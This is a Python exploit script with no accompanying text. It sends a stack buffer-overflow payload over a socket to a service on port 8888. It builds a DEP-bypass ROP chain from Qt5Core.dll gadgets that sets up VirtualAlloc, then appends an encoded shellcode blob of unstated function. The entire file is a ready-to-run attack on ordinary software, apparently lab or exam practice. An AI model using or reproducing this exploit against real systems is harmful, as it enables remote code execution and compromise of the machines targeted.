from struct import pack
import socket

#\x00\x0A\x0D

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888
target = (TARGET_IP, TARGET_PORT) 


#690398A0 - virtual alloc
crash = 2000  # change me
offset = 1052

rop_nop = pack("<I",0x68ee5174) # RETN

shellcode =  b""
shellcode += b"\xbd\xc7\x27\xb4\xc8\xda\xce\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x53\x83\xef\xfc\x31\x6f\x0e"
shellcode += b"\x03\xa8\x29\x56\x3d\xca\xde\x14\xbe\x32\x1f"
shellcode += b"\x79\x36\xd7\x2e\xb9\x2c\x9c\x01\x09\x26\xf0"
shellcode += b"\xad\xe2\x6a\xe0\x26\x86\xa2\x07\x8e\x2d\x95"
shellcode += b"\x26\x0f\x1d\xe5\x29\x93\x5c\x3a\x89\xaa\xae"
shellcode += b"\x4f\xc8\xeb\xd3\xa2\x98\xa4\x98\x11\x0c\xc0"
shellcode += b"\xd5\xa9\xa7\x9a\xf8\xa9\x54\x6a\xfa\x98\xcb"
shellcode += b"\xe0\xa5\x3a\xea\x25\xde\x72\xf4\x2a\xdb\xcd"
shellcode += b"\x8f\x99\x97\xcf\x59\xd0\x58\x63\xa4\xdc\xaa"
shellcode += b"\x7d\xe1\xdb\x54\x08\x1b\x18\xe8\x0b\xd8\x62"
shellcode += b"\x36\x99\xfa\xc5\xbd\x39\x26\xf7\x12\xdf\xad"
shellcode += b"\xfb\xdf\xab\xe9\x1f\xe1\x78\x82\x24\x6a\x7f"
shellcode += b"\x44\xad\x28\xa4\x40\xf5\xeb\xc5\xd1\x53\x5d"
shellcode += b"\xf9\x01\x3c\x02\x5f\x4a\xd1\x57\xd2\x11\xbe"
shellcode += b"\x94\xdf\xa9\x3e\xb3\x68\xda\x0c\x1c\xc3\x74"
shellcode += b"\x3d\xd5\xcd\x83\x42\xcc\xaa\x1b\xbd\xef\xca"
shellcode += b"\x32\x7a\xbb\x9a\x2c\xab\xc4\x70\xac\x54\x11"
shellcode += b"\xec\xa4\xf3\xca\x13\x49\x43\xbb\x93\xe1\x2c"
shellcode += b"\xd1\x1b\xde\x4d\xda\xf1\x77\xe5\x27\xfa\x47"
shellcode += b"\xcf\xae\x1c\xcd\x3f\xe7\xb7\x79\x82\xdc\x0f"
shellcode += b"\x1e\xfd\x36\x38\x88\xb6\x50\xff\xb7\x46\x77"
shellcode += b"\x57\x2f\xcd\x94\x63\x4e\xd2\xb0\xc3\x07\x45"
shellcode += b"\x4e\x82\x6a\xf7\x4f\x8f\x1c\x94\xc2\x54\xdc"
shellcode += b"\xd3\xfe\xc2\x8b\xb4\x31\x1b\x59\x29\x6b\xb5"
shellcode += b"\x7f\xb0\xed\xfe\x3b\x6f\xce\x01\xc2\xe2\x6a"
shellcode += b"\x26\xd4\x3a\x72\x62\x80\x92\x25\x3c\x7e\x55"
shellcode += b"\x9c\x8e\x28\x0f\x73\x59\xbc\xd6\xbf\x5a\xba"
shellcode += b"\xd6\x95\x2c\x22\x66\x40\x69\x5d\x47\x04\x7d"
shellcode += b"\x26\xb5\xb4\x82\xfd\x7d\xd4\x60\xd7\x8b\x7d"
shellcode += b"\x3d\xb2\x31\xe0\xbe\x69\x75\x1d\x3d\x9b\x06"
shellcode += b"\xda\x5d\xee\x03\xa6\xd9\x03\x7e\xb7\x8f\x23"
shellcode += b"\x2d\xb8\x85"


#step 1 - saving esp to eax,edi
rop = pack("<I",0x68c7f391)  # PUSH ESP # POP EBX # POP ESI # RETN 
rop += pack('<L',0x41414141) # padding for pop ebp
rop += pack("<I",0x68bbd10f)  # MOV EAX,EBX # POP EBX # RETN 0x04  
rop += pack('<L',0x41414141) # padding for pop ebp
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04
rop += pack("<I",0x68f37dbb)  # MOV EDI,EAX # RETN    ** [Qt5Core.dll] ** 

#step 2 - jumping over temaplte
rop += pack("<I",0x68b402ce)  # ADD ESP,1C # RETN    ** [Qt5Core.dll] **  

rop += pack("<L", 0x690398A0) # VirutalAlloc Address 
rop += pack("<L", 0x55555555) # Shellcode Return Address 
rop += pack("<L", 0x44444444) # # dummy Shellcode Address 
rop += pack("<L", 0x33333333) # dummy dwSize  
rop += pack("<L", 0x22222222) # # dummy flAllocationType  
rop += pack("<L", 0x11111111) # dummy flProtect

rop += b"\x90"*4 # padding
# step 3 - patching address virtualprotect
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68f26a35)  # INC EAX # RETN 
rop += pack('<L', 0x68be726b)  # xchg eax, ecx; ret;
rop += pack('<L', 0x6ab445f9)  # mov eax, ecx; ret;
rop += pack('<L', 0x6aa8d803)  # mov eax, dword ptr [eax]; ret;
rop += pack('<L', 0x6aa8d803)  # mov eax, dword ptr [eax]; ret;
rop += pack('<L', 0x68c7ffe6)  # mov dword ptr [ecx], eax; ret 4;
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04

# patching return address
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x6ab445f9)  # mov eax, ecx; ret;
rop += pack('<L', 0x68a8174b)  # XOR EDX,EDX # RETN  
rop += pack('<L', 0x68ae2632)  # POP EDX # RETN   
rop += pack('<L', 0xfffffd90) # -624
rop += pack('<L', 0x68bd5fe4)  # NEG EDX # RETN 0x0C 
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += pack('<L', 0x68ad91ab)  # add eax, edx; ret;
rop += pack('<L', 0x68c7ffe6)  # mov dword ptr [ecx], eax; ret 4;
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04

#patching lpaddress
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68c7ffe6)  # mov dword ptr [ecx], eax; ret 4;
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04

#patching dWsize
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68c6092e)  # XOR EAX,EAX # RETN    ** [Qt5Core.dll] ** 
rop += pack('<L', 0x68f21874)  # POP EAX # RETN    **
rop += pack('<L', 0xffffffff)
rop += pack('<L', 0x68cef5b2)  # NEG EAX # RETN  
rop += pack('<L', 0x68c7ffe6)  # mov dword ptr [ecx], eax; ret 4;
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04

#patching flAllocationType - 0x1000
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68c6092e)  # XOR EAX,EAX # RETN    ** [Qt5Core.dll] ** 
rop += pack('<L', 0x68f21874)  # POP EAX # RETN    **
rop += pack('<L', 0xffffefff)  # -1001
rop += pack('<L', 0x68cef5b2)  # NEG EAX # RETN  
rop += pack('<L', 0x68ab39b8) # DEC EAX # RETN   
rop += pack('<L', 0x68c7ffe6)  # mov dword ptr [ecx], eax; ret 4;
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04

#patching flProtect  - 0x40
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383) # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68fe0383)  # INC ECX # RETN 
rop += pack('<L', 0x68c6092e)  # XOR EAX,EAX # RETN    ** [Qt5Core.dll] ** 
rop += pack('<L', 0x68f21874)  # POP EAX # RETN    **
rop += pack('<L', 0xffffffc0)  # -40
rop += pack('<L', 0x68cef5b2)  # NEG EAX # RETN  
rop += pack('<L', 0x68c7ffe6)  # mov dword ptr [ecx], eax; ret 4;
rop += rop_nop # padding for retn 0x04
rop += rop_nop # padding for retn 0x04

#jumping to esp
rop += pack('<L', 0x68be726b)  # xchg eax, ecx; ret;
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68f9433e)  # DEC EAX # RETN  
rop += pack('<L',0x68aef5d0)  # XCHG EAX,ESP # RETN 

print(700 - len(rop))
rop += b"\x90" * (700 - len(rop))


payload = b"A"*offset
payload += rop_nop
payload += rop

print(crash - len(payload))
payload += shellcode
payload += b"C"*(crash - len(payload))

with socket.create_connection(target) as sock:

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
